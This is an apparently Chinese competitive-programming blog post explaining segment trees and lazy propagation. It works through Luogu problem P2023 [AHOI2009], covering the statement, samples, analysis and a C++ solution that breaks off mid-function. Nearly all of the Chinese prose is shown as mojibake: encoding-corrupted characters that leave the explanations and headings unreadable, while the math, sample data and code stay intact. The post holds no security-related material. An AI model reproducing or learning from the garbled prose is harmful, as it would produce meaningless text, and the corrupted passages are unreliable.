‘ä¸Šçš„ä¿¡æ¯ä¸€èˆ¬æ»¡è¶³è¿™æ ·çš„æ€§è´¨ï¼Œä¸€äº›æ•°åŸŸä¸Šçš„åŠ æ³•ä¸ä¹˜æ³•è‡ªç„¶ï¼Œè€ƒè™‘äºŒå…ƒçš„ $\max(x,y)$ è¿ç®—ï¼Œæ­¤æ—¶å¹ºå…ƒä¸º $-\infty$ ä¹Ÿæ»¡è¶³è¿™æ ·çš„æ€§è´¨ï¼ˆä¸€èˆ¬å·¦å³å¹ºå…ƒç›¸åŒæ—¶ç®€ç§°ä¸ºå¹ºå…ƒï¼‰ã€‚</p><p>çº¿æ®µæ ‘å°†æ¯ä¸ªé•¿åº¦ä¸ä¸º $1$ çš„åŒºé—´åˆ’åˆ†æˆå·¦å³ä¸¤ä¸ªåŒºé—´é€’å½’æ±‚è§£ï¼ŒæŠŠæ•´ä¸ªçº¿æ®µåˆ’åˆ†ä¸ºä¸€ä¸ªæ ‘å½¢ç»“æ„ï¼Œé€šè¿‡åˆå¹¶å·¦å³ä¸¤åŒºé—´ä¿¡æ¯æ¥æ±‚å¾—è¯¥åŒºé—´çš„ä¿¡æ¯ã€‚è¿™ç§æ•°æ®ç»“æ„å¯ä»¥æ–¹ä¾¿çš„è¿›è¡Œå¤§éƒ¨åˆ†çš„åŒºé—´æ“ä½œã€‚</p><p>æœ‰ä¸ªå¤§å°ä¸º $5$ çš„æ•°ç»„ $a={10,11,12,13,14}$ï¼Œè¦å°†å…¶è½¬åŒ–ä¸ºçº¿æ®µæ ‘ï¼Œæœ‰ä»¥ä¸‹åšæ³•ï¼šè®¾çº¿æ®µæ ‘çš„æ ¹èŠ‚ç‚¹ç¼–å·ä¸º $1$ï¼Œç”¨æ•°ç»„ $d$ æ¥ä¿å­˜æˆ‘ä»¬çš„çº¿æ®µæ ‘ï¼Œ$d_i$ ç”¨æ¥ä¿å­˜çº¿æ®µæ ‘ä¸Šç¼–å·ä¸º $i$ çš„èŠ‚ç‚¹çš„å€¼ï¼ˆè¿™é‡Œæ¯ä¸ªèŠ‚ç‚¹æ‰€ç»´æŠ¤çš„å€¼å°±æ˜¯è¿™ä¸ªèŠ‚ç‚¹æ‰€è¡¨ç¤ºçš„åŒºé—´æ€»å’Œï¼‰ã€‚</p><p>æˆ‘ä»¬å…ˆç»™å‡ºè¿™æ£µçº¿æ®µæ ‘çš„å½¢æ€ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="/2022/07/21/%E7%BA%BF%E6%AE%B5%E6%A0%91%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83/segt1.svg"></p><p>å›¾ä¸­æ¯ä¸ªèŠ‚ç‚¹ä¸­ç”¨çº¢è‰²å­—ä½“æ ‡æ˜çš„åŒºé—´ï¼Œè¡¨ç¤ºè¯¥èŠ‚ç‚¹ç®¡è¾–çš„ $a$ æ•°ç»„ä¸Šçš„ä½ç½®åŒºé—´ã€‚å¦‚ $d_1$ æ‰€ç®¡è¾–çš„åŒºé—´å°±æ˜¯ $[1,5]$ï¼ˆ$a_1,a_2, \cdots ,a_5$ï¼‰ï¼Œå³ $d_1$ æ‰€ä¿å­˜çš„å€¼æ˜¯ $a_1+a_2+ \cdots +a_5$ï¼Œ$d_1=60$ è¡¨ç¤ºçš„æ˜¯ $a_1+a_2+ \cdots +a_5=60$ã€‚</p><p>é€šè¿‡è§‚å¯Ÿä¸éš¾å‘ç°ï¼Œ$d_i$ çš„å·¦å„¿å­èŠ‚ç‚¹å°±æ˜¯ $d_{2\times i}$ï¼Œ$d_i$ çš„å³å„¿å­èŠ‚ç‚¹å°±æ˜¯ $d_{2\times i+1}$ã€‚å¦‚æœ $d_i$ è¡¨ç¤ºçš„æ˜¯åŒºé—´ $[s,t]$ï¼ˆå³ $d_i=a_s+a_{s+1}+ \cdots +a_t$) çš„è¯ï¼Œé‚£ä¹ˆ $d_i$ çš„å·¦å„¿å­èŠ‚ç‚¹è¡¨ç¤ºçš„æ˜¯åŒºé—´ $[ s, \frac{s+t}{2} ]$ï¼Œ$d_i$ çš„å³å„¿å­è¡¨ç¤ºçš„æ˜¯åŒºé—´ $[ \frac{s+t}{2} +1,t ]$ã€‚</p><p>åœ¨å®ç°æ—¶ï¼Œæˆ‘ä»¬è€ƒè™‘é€’å½’å»ºæ ‘ã€‚è®¾å½“å‰çš„æ ¹èŠ‚ç‚¹ä¸º $p$ï¼Œå¦‚æœæ ¹èŠ‚ç‚¹ç®¡è¾–çš„åŒºé—´é•¿åº¦å·²ç»æ˜¯ $1$ï¼Œåˆ™å¯ä»¥ç›´æ¥æ ¹æ® $a$ æ•°ç»„ä¸Šç›¸åº”ä½ç½®çš„å€¼åˆå§‹åŒ–è¯¥èŠ‚ç‚¹ã€‚å¦åˆ™æˆ‘ä»¬å°†è¯¥åŒºé—´ä»ä¸­ç‚¹å¤„åˆ†å‰²ä¸ºä¸¤ä¸ªå­åŒºé—´ï¼Œåˆ†åˆ«è¿›å…¥å·¦å³å­èŠ‚ç‚¹é€’å½’å»ºæ ‘ï¼Œæœ€ååˆå¹¶ä¸¤ä¸ªå­èŠ‚ç‚¹çš„ä¿¡æ¯ã€‚ï¼ˆä»¥ä¸Šæ¥è‡ªwikiï¼‰</p><p>åœ¨è¿›è¡ŒåŒºé—´æ“ä½œçš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¸ä¼šæŠŠçŠ¶æ€æ›´æ–°åˆ°æ¯ä¸ªèŠ‚ç‚¹ï¼Œå¦‚æœæ›´æ–°ï¼Œé‚£ä¹ˆä¸€æ¬¡æ“ä½œæœ€å¤§çš„å¤æ‚åº¦ä¼šæ˜¯ $O(n)$ã€‚å› æ­¤æˆ‘ä»¬ä¼šé‡‡å–æ‡’æƒ°æ ‡è®°çš„æ–¹å¼å»è®°å½•è¿™æ¬¡çš„æ“ä½œï¼Œå¦‚æœè¿™æ¬¡æ›´æ–°å®Œæ•´åœ°åŒ…å«äº†ä¸€ä¸ªåŒºé—´ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯¹è¿™ä¸ªåŒºé—´æ‰“ä¸Šæ‡’æƒ°æ ‡è®°ï¼Œä¸ç»§ç»­å¾€ä¸‹æ›´æ–°ï¼Œè‹¥è¦æŸ¥è¯¢ï¼Œåˆ™ä¼šå°†æ‡’æƒ°æ ‡è®°åŠ åˆ°å¯¹åº”çš„èŠ‚ç‚¹ä¸Šå»ã€‚å¯ä»¥è¯æ˜ï¼Œæ¯ä¸€æ¬¡æ“ä½œä¸ä¼šè¶…è¿‡4ä¸ªåŒºé—´ï¼ŒåŠ ä¸ŠåŒºé—´æ“ä½œæ˜¯ä»ä¸Šå¾€ä¸‹å»¶çš„ï¼Œé‚£ä¹ˆä¸€æ¬¡æ“ä½œç†è®ºæœ€åçš„æƒ…å†µåº”è¯¥æ˜¯ $O(log_2n)$ï¼Œéå¸¸ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚ã€‚æŸ¥è¯¢å¤æ‚åº¦åŒç†ï¼Œä¹Ÿæ˜¯ $O(log_2n)$ã€‚</p><p>è¿™é‡Œéœ€è¦æ³¨æ„å‡ ç‚¹ï¼š</p><h2 id="æ‡’æƒ°æ ‡è®°æ€ä¹ˆæ‰“ï¼Ÿ"><a href="#æ‡’æƒ°æ ‡è®°æ€ä¹ˆæ‰“ï¼Ÿ" class="headerlink" title="æ‡’æƒ°æ ‡è®°æ€ä¹ˆæ‰“ï¼Ÿ"></a>æ‡’æƒ°æ ‡è®°æ€ä¹ˆæ‰“ï¼Ÿ</h2><p>å½“å½“å‰åŒºé—´å®Œå…¨åŒ…å«äºæˆ‘è¦æ“ä½œçš„åŒºé—´ï¼Œè¿™ä¸ªæ—¶å€™å¯èƒ½ä¼šæœ‰ç‚¹ç–‘é—®ï¼Œè¿™ä¸ªåŒºé—´çš„å€¼æˆ‘æ˜¯åŠ æˆ–è€…ä¸åŠ ï¼Œæˆ‘çš„æ‡’æƒ°æ ‡è®°è‚¯å®šä¼šç»™åˆ°è¿™ä¸ªåŒºé—´ï¼Œä½†æ˜¯è¿™ä¸ªå€¼åŠ ä¸åŠ ï¼Œæ‡’æƒ°æ ‡è®°ç»™åˆ°äº†ï¼Œé‚£ä¹ˆä¸€ä¸ªåŒºé—´å¸¦äº†ä¸€ä¸ªæ‡’æƒ°æ ‡è®°ï¼Œå®ƒçš„å€¼åˆ°åº•æ˜¯æ„å‘³ç€åŠ äº†è¿˜æ˜¯æ²¡åŠ å‘¢ï¼Ÿå› ä¸ºæ„Ÿè§‰ç†è®ºä¸Šå¥½åƒéƒ½å¯è¡Œçš„ï¼Œä½†æ˜¯è¿™é‡Œå®é™…æƒ…å†µæ˜¯ï¼šè¦åŠ ï¼å› ä¸ºæˆ‘åŒºé—´çš„å€¼ä¼šè¢«æ›´æ–°åˆ°çˆ¶äº²èŠ‚ç‚¹ï¼Œå¦‚æœæˆ‘ä¸åŠ ï¼Œé‚£ä¹ˆæ›´æ–°ä¸Šå»çš„èŠ‚ç‚¹å€¼å°±æ˜¯é”™è¯¯çš„ã€‚å› æ­¤æ­¤æ—¶æˆ‘ä¸€å®šè¦æŠŠå€¼åŠ ä¸Šå»ã€‚é‚£ä¹ˆä¸€ä¸ªåŒºé—´å¸¦äº†æ‡’æƒ°æ ‡è®°å®ƒçš„å«ä¹‰æ˜¯ï¼šæˆ‘è‡ªå·±çš„å€¼å·²ç»åŠ ä¸Šå»äº†ï¼Œä½†æ˜¯æˆ‘çš„å„¿å­åŒºé—´å’Œå­™å­ï¼Œæ›¾å­™å­åŒºé—´éƒ½æ²¡åŠ ä¸Šè¿™ä¸ªå€¼ï¼Œç­‰ä¼šè¿‡æ¥çš„æ—¶å€™éƒ½éœ€è¦åŠ ä¸Šï¼Œé‚£ä¹ˆå¸¦äº†æ‡’æƒ°æ ‡è®°çš„é‚£ä¸ªåŒºé—´æ˜¯å·²ç»åŠ ä¸Šäº†çš„ã€‚</p><p>æ‰€ä»¥æ‡’æƒ°æ ‡è®°ä»€ä¹ˆå«ä¹‰ä¸€å®šè¦ææ¸…æ¥šï¼Œä¸èƒ½æ¨¡æ£±ä¸¤å¯ï¼Œä¸èƒ½ï¼Œä¸èƒ½ï¼ï¼ï¼</p><h2 id="ä»€ä¹ˆæ—¶å€™push-down"><a href="#ä»€ä¹ˆæ—¶å€™push-down" class="headerlink" title="ä»€ä¹ˆæ—¶å€™push down"></a>ä»€ä¹ˆæ—¶å€™push down</h2><p>æ‡’æƒ°æ ‡è®°ä¸‹ä¼ çš„æ“ä½œæˆ‘ä»¬å« <code>push_down</code>ã€‚ä»€ä¹ˆæ—¶å€™éœ€è¦å‘¢ï¼Ÿæˆ‘ä»¬ç†è§£äº†æ‡’æƒ°æ ‡è®°çš„å«ä¹‰ä¹‹åï¼Œæˆ‘ä»¬å°±æ¸…æ¥šäº†ï¼Œå¸¦äº†æ‡’æƒ°æ ‡è®°çš„åŒºé—´ï¼Œæœ¬èº«å·²ç»åŠ ä¸Šäº†å€¼ï¼Œåªæ˜¯å„¿å­éƒ½æ²¡åŠ ä¸Šå»ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ç›´æ¥å†å¯¹æ•´ä¸ªåŒºé—´æ“ä½œï¼Œéœ€ä¸éœ€è¦ <code>push_down</code> å‘¢ï¼Ÿä¸éœ€è¦ï¼Œå› ä¸ºè¿™ä¸ªåŒºé—´å·²ç»æ˜¯çœŸå®å€¼äº†ï¼Œä½†æ˜¯æˆ‘åœ¨å¯¹ä¸€ä¸ªå¸¦æœ‰æ‡’æƒ°æ ‡è®°çš„åŒºé—´çš„å„¿å­åŒºé—´å°è¯•è¿›è¡Œæ“ä½œçš„æ—¶å€™å‘¢ï¼Ÿé‚£è‚¯å®šéœ€è¦äº†ï¼å› ä¸ºå„¿å­åŒºé—´è¿˜ä¸æ˜¯çœŸå®å€¼ï¼Œè¿˜å¾—åŠ ä¸Šçˆ¶äº²ç»™å®ƒçš„æ‡’æƒ°æ ‡è®°æ‰æ˜¯ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬ <code>push_down</code> ä¸€æ¬¡å°±ä¼šæŠŠä¸€ä¸ªåŒºé—´çš„æ‡’æƒ°æ ‡è®°æ¸…é›¶ï¼Œç»™å¯¹åº”çš„ä¸¤ä¸ªå„¿å­åŒºé—´åŠ ä¸Šå¯¹åº”çš„å€¼ï¼Œå¹¶æŠŠæ‡’æƒ°æ ‡è®°åˆ†å‘ç»™ä»–ä»¬ã€‚</p><h1 id="ç»ƒä¹ é¢˜"><a href="#ç»ƒä¹ é¢˜" class="headerlink" title="ç»ƒä¹ é¢˜"></a>ç»ƒä¹ é¢˜</h1><h2 id="P2023-AHOI2009-ç»´æŠ¤åºåˆ—"><a href="#P2023-AHOI2009-ç»´æŠ¤åºåˆ—" class="headerlink" title="P2023 [AHOI2009] ç»´æŠ¤åºåˆ—"></a>P2023 [AHOI2009] ç»´æŠ¤åºåˆ—</h2><h3 id="é¢˜ç›®èƒŒæ™¯"><a href="#é¢˜ç›®èƒŒæ™¯" class="headerlink" title="é¢˜ç›®èƒŒæ™¯"></a>é¢˜ç›®èƒŒæ™¯</h3><p>è€å¸ˆäº¤ç»™å°å¯å¯ä¸€ä¸ªç»´æŠ¤æ•°åˆ—çš„ä»»åŠ¡ï¼Œç°åœ¨å°å¯å¯å¸Œæœ›ä½ æ¥å¸®ä»–å®Œæˆã€‚</p><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>æœ‰ä¸€ä¸ªé•¿ä¸º $n$ çš„æ•°åˆ— ${a_n}$ï¼Œæœ‰å¦‚ä¸‹ä¸‰ç§æ“ä½œå½¢å¼ï¼š</p><ol><li>æ ¼å¼ <code>1 t g c</code>ï¼Œè¡¨ç¤ºæŠŠæ‰€æœ‰æ»¡è¶³ $t\le i\le g$ çš„ $a_i$ æ”¹ä¸º $a_i\times c$ ;</li><li>æ ¼å¼ <code>2 t g c</code> è¡¨ç¤ºæŠŠæ‰€æœ‰æ»¡è¶³ $t\le i\le g$ çš„ $a_i$ æ”¹ä¸º $a_i+c$ ;</li><li>æ ¼å¼ <code>3 t g</code> è¯¢é—®æ‰€æœ‰æ»¡è¶³ $t\le i\le g$ çš„ $a_i$ çš„å’Œï¼Œç”±äºç­”æ¡ˆå¯èƒ½å¾ˆå¤§ï¼Œä½ åªéœ€è¾“å‡ºè¿™ä¸ªæ•°æ¨¡ $p$ çš„å€¼ã€‚</li></ol><h3 id="è¾“å…¥æ ¼å¼"><a href="#è¾“å…¥æ ¼å¼" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h3><p>ç¬¬ä¸€è¡Œä¸¤ä¸ªæ•´æ•° $n$ å’Œ $p$ã€‚</p><p>ç¬¬äºŒè¡Œå«æœ‰ $n$ ä¸ªéè´Ÿæ•´æ•°ï¼Œè¡¨ç¤ºæ•°åˆ— ${a_i}$ ã€‚</p><p>ç¬¬ä¸‰è¡Œæœ‰ä¸€ä¸ªæ•´æ•° $m$ï¼Œè¡¨ç¤ºæ“ä½œæ€»æ•°ã€‚</p><p>ä»ç¬¬å››è¡Œå¼€å§‹æ¯è¡Œæè¿°ä¸€ä¸ªæ“ä½œï¼ŒåŒä¸€è¡Œç›¸é‚»ä¸¤æ•°ä¹‹é—´ç”¨ä¸€ä¸ªç©ºæ ¼éš”å¼€ï¼Œæ¯è¡Œå¼€å¤´å’Œæœ«å°¾æ²¡æœ‰å¤šä½™ç©ºæ ¼ã€‚</p><h3 id="è¾“å‡ºæ ¼å¼"><a href="#è¾“å‡ºæ ¼å¼" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h3><p>å¯¹æ¯ä¸ªæ“ä½œ 3ï¼ŒæŒ‰ç…§å®ƒåœ¨è¾“å…¥ä¸­å‡ºç°çš„é¡ºåºï¼Œä¾æ¬¡è¾“å‡º<strong>ä¸€è¡Œä¸€ä¸ªæ•´æ•°</strong>è¡¨ç¤ºè¯¢é—®ç»“æœã€‚</p><h3 id="æ ·ä¾‹-1"><a href="#æ ·ä¾‹-1" class="headerlink" title="æ ·ä¾‹ #1"></a>æ ·ä¾‹ #1</h3><h4 id="æ ·ä¾‹è¾“å…¥-1"><a href="#æ ·ä¾‹è¾“å…¥-1" class="headerlink" title="æ ·ä¾‹è¾“å…¥ #1"></a>æ ·ä¾‹è¾“å…¥ #1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">7 43</span><br><span class="line">1 2 3 4 5 6 7</span><br><span class="line">5</span><br><span class="line">1 2 5 5</span><br><span class="line">3 2 4</span><br><span class="line">2 3 7 9</span><br><span class="line">3 1 3</span><br><span class="line">3 4 7</span><br></pre></td></tr></table></figure><h4 id="æ ·ä¾‹è¾“å‡º-1"><a href="#æ ·ä¾‹è¾“å‡º-1" class="headerlink" title="æ ·ä¾‹è¾“å‡º #1"></a>æ ·ä¾‹è¾“å‡º #1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">35</span><br><span class="line">8</span><br></pre></td></tr></table></figure><h3 id="æç¤º"><a href="#æç¤º" class="headerlink" title="æç¤º"></a>æç¤º</h3><h4 id="æ ·ä¾‹è¾“å…¥è¾“å‡º-1-è§£é‡Š"><a href="#æ ·ä¾‹è¾“å…¥è¾“å‡º-1-è§£é‡Š" class="headerlink" title="æ ·ä¾‹è¾“å…¥è¾“å‡º 1 è§£é‡Š"></a>æ ·ä¾‹è¾“å…¥è¾“å‡º 1 è§£é‡Š</h4><ul><li>åˆå§‹æ—¶æ•°åˆ—ä¸º ${1,2,3,4,5,6,7}$ã€‚</li><li>ç»è¿‡ç¬¬ $1$ æ¬¡æ“ä½œåï¼Œæ•°åˆ—ä¸º ${1,10,15,20,25,6,7}$ã€‚</li><li>å¯¹ç¬¬ $2$ æ¬¡æ“ä½œï¼Œå’Œä¸º $10+15+20=45$ï¼Œæ¨¡ $43$ çš„ç»“æœæ˜¯ $2$ã€‚</li><li>ç»è¿‡ç¬¬ $3$ æ¬¡æ“ä½œåï¼Œæ•°åˆ—ä¸º ${1,10,24,29,34,15,16}$ã€‚</li><li>å¯¹ç¬¬ $4$ æ¬¡æ“ä½œï¼Œå’Œä¸º $1+10+24=35$ï¼Œæ¨¡ $43$ çš„ç»“æœæ˜¯ $35$ã€‚</li><li>å¯¹ç¬¬ $5$ æ¬¡æ“ä½œï¼Œå’Œä¸º $29+34+15+16=94$ï¼Œæ¨¡ $43$ çš„ç»“æœæ˜¯$8$ã€‚</li></ul><h4 id="æ•°æ®è§„æ¨¡ä¸çº¦å®š"><a href="#æ•°æ®è§„æ¨¡ä¸çº¦å®š" class="headerlink" title="æ•°æ®è§„æ¨¡ä¸çº¦å®š"></a>æ•°æ®è§„æ¨¡ä¸çº¦å®š</h4><p>æµ‹è¯•æ•°æ®è§„æ¨¡å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š</p><table><thead><tr><th align="center">æ•°æ®ç‚¹ç¼–å·</th><th align="center">1</th><th align="center">2</th><th align="center">3</th><th align="center">4</th><th align="center">5</th><th align="center">6</th><th align="center">7</th><th align="center">8</th><th align="center">9,10</th></tr></thead><tbody><tr><td align="center">$n=$</td><td align="center">$10$</td><td align="center">$1000$</td><td align="center">$1000$</td><td align="center">$10000$</td><td align="center">$60000$</td><td align="center">$70000$</td><td align="center">$80000$</td><td align="center">$90000$</td><td align="center">$100000$</td></tr><tr><td align="center">$m=$</td><td align="center">$10$</td><td align="center">$1000$</td><td align="center">$1000$</td><td align="center">$10000$</td><td align="center">$60000$</td><td align="center">$70000$</td><td align="center">$80000$</td><td align="center">$90000$</td><td align="center">$100000$</td></tr></tbody></table><p>å¯¹äºå…¨éƒ¨çš„æµ‹è¯•ç‚¹ï¼Œä¿è¯ $0 \leq p, a_i, c \leq 10^9$ï¼Œ$1 \leq t \leq g \leq n$ã€‚</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æ˜¯ä¸€ä¸ªçº¿æ®µæ ‘çš„ç¿»ç‰ˆé¢˜ï¼Œåªä¸è¿‡è¦å–æ¨¡ï¼Œå¹¶ä¸”æœ‰ä¹˜æ³•ï¼Œä¹˜æ³•å…¶å®è·ŸåŠ æ³•ä¸€æ ·ï¼Œå¦‚æœåŒºé—´é‡Œçš„æ•°éƒ½ä¹˜ä¸Šä¸€ä¸ªæ•°ï¼Œé‚£ä¹ˆå…¶å®å°±ç›¸å½“äºå…ˆå’Œå†ä¹˜ï¼Œä¹˜æ³•æ‡’æƒ°æ ‡è®°é»˜è®¤åº”è¯¥ä¸º1ã€‚å› ä¸ºæ—¢æœ‰åŠ æ³•ä¹Ÿæœ‰ä¹˜æ³•ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸¤ä¸ªæ‡’æƒ°æ ‡è®°ï¼Œå½“æ‡’æƒ°æ ‡è®°ä¹˜ä¸Šå»æ—¶ï¼ŒåŠ æ³•çš„æ‡’æƒ°æ ‡è®°åº”è¯¥å¯¹åº”è¦ä¹˜ä¸Šå»ï¼Œåœ¨push_downçš„æ—¶å€™ï¼Œæˆ‘ä»¬å…ˆä¹˜ï¼Œå†åŠ å³å¯ã€‚</p><h2 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> n,p;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">e</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l;</span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="keyword">int</span> sum;</span><br><span class="line">    <span class="keyword">int</span> lazy1;</span><br><span class="line">    <span class="keyword">int</span> lazy2;</span><br><span class="line">&#125;tree[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    tree[now].l=l;</span><br><span class="line">    tree[now].r=r;</span><br><span class="line">    tree[now].lazy1=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">        tree[now].sum=a[r];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">build</span>(now&lt;&lt;<span class="number">1</span>,l,mid);</span><br><span class="line">    <span class="built_in">build</span>(now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">    tree[now].sum=(tree[now&lt;&lt;<span class="number">1</span>].sum+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum)%p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_lazy</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> lazy1,<span class="keyword">int</span> lazy2)</span></span>&#123;</span><br><span class="line">    tree[i].sum*=lazy1;</span><br><span class="line">    tree[i].sum%=p;</span><br><span class="line">    tree[i].sum+=(tree[i].r-tree[i].l+<span class="number">1</span>)*lazy2;</span><br><span class="line">    tree[i].sum%=p;</span><br><span class="line">    tree[i].lazy1*=lazy1;</span><br><span class="line">    tree[i].lazy2*=lazy1;</span><br><span class="line">    tree[i].lazy1%=p;</span><br><span class="line">    tree[i].lazy2%=p;</span><br><span class="line">    tree[i].lazy2+=lazy2;</span><br><span class="line">    tree[i].lazy2%=p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push_down</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lazy1=tree[i].lazy1,lazy2=tree[i].lazy2;</span><br><span class="line">    tree[i].lazy1=<span class="number">1</span>;</span><br><span class="line">    tree[i].lazy2=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">add_lazy</span>(i&lt;&lt;<span class="number">1</span>,lazy1,lazy2);</span><br><span class="line">    <span class="built_in">add_lazy</span>(i&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,lazy1,lazy2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    <span class="comment">//printf(&quot;query(%lld,%lld,%lld)\n&quot;,l,r,now);</span></span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[now].l&amp;&amp;r&gt;=tree[now].r)&#123;</span><br><span class="line">        ans+=tree[now].sum;</span><br><span class="line">        <span class="comment">//printf(&quot;sum=%d\n&quot;,tree[now].sum);</span></span><br><span class="line">        ans%=p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">push_down</span>(now);</span><br><span class="line">        <span class="keyword">int</span> mid=tree[now].l+tree[now].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">query</span>(l,r,now&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">query</span>(l,r,now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">        tree[now].sum=tree[now&lt;&lt;<span class="number">1</span>].sum+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum;</span><br><span class="line">        tree[now].sum%=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span 